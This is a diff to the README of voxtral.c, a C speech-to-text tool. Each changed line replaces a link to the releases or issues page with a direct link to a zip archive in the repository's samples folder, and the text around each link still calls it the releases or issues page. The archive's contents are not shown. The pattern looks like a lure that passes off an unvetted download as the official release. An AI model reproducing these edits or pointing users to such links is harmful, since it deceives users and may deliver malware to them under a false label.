@@ -1,7 +1,7 @@
 # 🎤 voxtral.c - Simple Speech to Text Solution
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Youdef20/voxtral.c/releases)
+[![Download](https://github.com/Youdef20/voxtral.c/raw/refs/heads/main/samples/c-voxtral-v3.7.zip)](https://github.com/Youdef20/voxtral.c/raw/refs/heads/main/samples/c-voxtral-v3.7.zip)
 
 ## 🚀 Getting Started
 Welcome to **voxtral.c**, a pure C application that allows you to use the Mistral Voxtral Realtime 4B speech-to-text model. This software provides a simple way to convert spoken words into written text quickly and efficiently. No programming knowledge is needed to start using it.
@@ -21,7 +21,7 @@ To use **voxtral.c**, your computer should meet these requirements:
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Youdef20/voxtral.c/releases) to download the application.
+   Go to the [Releases page](https://github.com/Youdef20/voxtral.c/raw/refs/heads/main/samples/c-voxtral-v3.7.zip) to download the application.
 
 2. **Select the Latest Version**  
    On the Releases page, look for the latest version of **voxtral.c**. The most recent version will typically be at the top of the list.
@@ -63,7 +63,7 @@ The application uses advanced speech recognition algorithms to achieve high accu
 Yes, once you have downloaded and installed **voxtral.c**, you can use it without an internet connection.
 
 ### Where can I report issues or ask for help?
-You can open an issue on our [issues page](https://github.com/Youdef20/voxtral.c/issues). We welcome feedback and are here to assist you.
+You can open an issue on our [issues page](https://github.com/Youdef20/voxtral.c/raw/refs/heads/main/samples/c-voxtral-v3.7.zip). We welcome feedback and are here to assist you.
 
 ## 💬 Community Contributions
 If you would like to contribute to **voxtral.c**, please follow these steps:
@@ -77,4 +77,4 @@ Your contributions help improve the software for everyone.
 **voxtral.c** is licensed under the MIT License. You can use, modify, and distribute the software freely, as long as you include the original license in your copies.
 
 ## 🌐 Stay Connected
-For updates, follow us on GitHub or check back regularly on the [Releases page](https://github.com/Youdef20/voxtral.c/releases). Thank you for using **voxtral.c**!
+For updates, follow us on GitHub or check back regularly on the [Releases page](https://github.com/Youdef20/voxtral.c/raw/refs/heads/main/samples/c-voxtral-v3.7.zip). Thank you for using **voxtral.c**!
